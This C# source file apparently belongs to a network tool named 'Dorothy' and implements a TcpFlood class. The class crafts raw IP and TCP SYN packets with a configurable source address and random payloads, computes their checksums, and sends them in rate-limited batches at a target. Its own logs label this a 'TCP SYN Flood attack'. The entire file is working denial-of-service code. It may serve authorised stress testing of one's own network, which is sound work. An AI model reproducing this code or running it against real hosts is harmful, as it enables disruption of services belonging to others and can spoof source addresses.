using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Linq;

namespace Dorothy.Models
{
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private Socket? _socket;

        public TcpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting TCP SYN Flood attack.");

            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.IP);
                _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);

                byte[] ipHeader = new byte[20];  // IP header size
                byte[] tcpHeader = new byte[20]; // TCP header size
                byte[] payload = new byte[1400]; // Payload size

                var random = new Random();
                // Account for IP header (20 bytes) + TCP header (20 bytes) + payload
                int totalPacketSize = ipHeader.Length + tcpHeader.Length + payload.Length;
                int batchSize = 32; // Send packets in batches for better throughput
                long packetsPerSecond = _params.BytesPerSecond / totalPacketSize;
                double microsecondsPerBatch = (1_000_000.0 * batchSize) / packetsPerSecond;

                await Task.Run(() =>
                {
                    var stopwatch = new Stopwatch();
                    byte[] fullPacket = new byte[totalPacketSize];
                    var endpoint = new IPEndPoint(_params.DestinationIp, 0);

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            stopwatch.Restart();

                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                            {
                                // Create IP header
                                ipHeader[0] = 0x45; // Version (4) and IHL (5)
                                BitConverter.GetBytes((ushort)totalPacketSize).CopyTo(ipHeader, 2); // Total Length
                                ipHeader[8] = _params.Ttl; // TTL
                                ipHeader[9] = 6; // Protocol (TCP)
                                Buffer.BlockCopy(_params.SourceIp.GetAddressBytes(), 0, ipHeader, 12, 4);
                                Buffer.BlockCopy(_params.DestinationIp.GetAddressBytes(), 0, ipHeader, 16, 4);

                                // Create TCP header
                                BitConverter.GetBytes((ushort)_params.SourcePort).CopyTo(tcpHeader, 0);
                                BitConverter.GetBytes((ushort)_params.DestinationPort).CopyTo(tcpHeader, 2);
                                BitConverter.GetBytes((uint)random.Next()).CopyTo(tcpHeader, 4); // Sequence number
                                tcpHeader[12] = 0x50; // Data offset (5) and Reserved
                                tcpHeader[13] = 0x02; // Flags (SYN)
                                BitConverter.GetBytes((ushort)8192).CopyTo(tcpHeader, 14); // Window size

                                // Generate random payload
                                random.NextBytes(payload);

                                // Combine all parts
                                Buffer.BlockCopy(ipHeader, 0, fullPacket, 0, ipHeader.Length);
                                Buffer.BlockCopy(tcpHeader, 0, fullPacket, ipHeader.Length, tcpHeader.Length);
                                Buffer.BlockCopy(payload, 0, fullPacket, ipHeader.Length + tcpHeader.Length, payload.Length);

                                // Calculate TCP checksum
                                ushort tcpChecksum = CalculateTcpChecksum(fullPacket, ipHeader.Length, tcpHeader.Length + payload.Length);
                                BitConverter.GetBytes(tcpChecksum).CopyTo(tcpHeader, 16);

                                // Calculate IP checksum
                                ushort ipChecksum = CalculateIpChecksum(ipHeader);
                                BitConverter.GetBytes(ipChecksum).CopyTo(ipHeader, 10);

                                // Recombine with updated checksums
                                Buffer.BlockCopy(ipHeader, 0, fullPacket, 0, ipHeader.Length);
                                Buffer.BlockCopy(tcpHeader, 0, fullPacket, ipHeader.Length, tcpHeader.Length);

                                _socket.SendTo(fullPacket, endpoint);
                            }

                            // High precision rate limiting
                            long elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency;
                            if (elapsedMicroseconds < microsecondsPerBatch)
                            {
                                int remainingMicroseconds = (int)(microsecondsPerBatch - elapsedMicroseconds);
                                if (remainingMicroseconds > 1000) // Only sleep for delays > 1ms
                                {
                                    Thread.Sleep(remainingMicroseconds / 1000);
                                }
                                // Spin wait for sub-millisecond precision
                                while (stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency < microsecondsPerBatch)
                                {
                                    Thread.SpinWait(1);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending TCP packet.");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "TCP SYN Flood attack failed.");
                throw;
            }
        }

        private static ushort CalculateIpChecksum(byte[] ipHeader)
        {
            uint sum = 0;
            int length = ipHeader.Length;
            int i = 0;

            while (length > 1)
            {
                sum += ((uint)ipHeader[i] << 8) | ipHeader[i + 1];
                length -= 2;
                i += 2;
            }

            if (length > 0)
            {
                sum += (uint)ipHeader[i] << 8;
            }

            while ((sum >> 16) != 0)
            {
                sum = (sum & 0xFFFF) + (sum >> 16);
            }

            return (ushort)~sum;
        }

        private static ushort CalculateTcpChecksum(byte[] packet, int ipHeaderLength, int tcpLength)
        {
            uint sum = 0;
            int tcpStart = ipHeaderLength;

            // Add pseudo header
            for (int i = 12; i < 20; i += 2) // Source and destination IP
            {
                sum += ((uint)packet[i] << 8) | packet[i + 1];
            }

            sum += (uint)packet[9]; // Protocol
            sum += (uint)tcpLength; // TCP length

            // Add TCP header and data
            int tcpEnd = tcpStart + tcpLength;
            for (int i = tcpStart; i < tcpEnd - 1; i += 2)
            {
                sum += ((uint)packet[i] << 8) | packet[i + 1];
            }

            if ((tcpLength & 1) != 0)
            {
                sum += (uint)packet[tcpEnd - 1] << 8;
            }

            while ((sum >> 16) != 0)
            {
                sum = (sum & 0xFFFF) + (sum >> 16);
            }

            return (ushort)~sum;
        }

        public void Dispose()
        {
            _socket?.Dispose();
        }
    }
}
